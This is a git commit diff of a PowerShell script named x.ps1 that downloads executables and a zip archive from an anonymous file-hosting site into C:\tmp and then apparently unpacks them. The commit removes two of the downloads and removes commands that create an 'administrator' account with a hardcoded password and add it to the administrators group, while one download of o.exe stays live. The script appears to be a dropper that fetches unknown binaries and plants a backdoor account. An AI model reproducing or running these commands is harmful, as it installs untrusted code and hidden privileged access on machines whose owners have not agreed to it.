e8ffa5ee96743cd412d78d607eea23cc37d3c552
marintushenko <104486447+marintushenko@users.noreply.github.com>
2022-04-27 13:16:34 +0300

    Update x.ps1

--- x.ps1
+++ x.ps1
@@ -1,11 +1,6 @@
 ﻿mkdir C:\tmp
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest https://dl.uploadgram.me/6268d3d703fb0h?raw -OutFile C:\tmp\www.zip
-Invoke-WebRequest https://dl.uploadgram.me/6268d32ac7ad0h?raw -OutFile C:\tmp\x.exe
 Invoke-WebRequest https://dl.uploadgram.me/6268d32a603d1h?raw -OutFile C:\tmp\o.exe
-net user administrator Admin7777 /add 
-net localgroup administrators administrator /add
-net user administrator /active:yes
 cd C:\tmp
 function unzip ($archive, $destination) {
     $shell = new-object -com shell.application
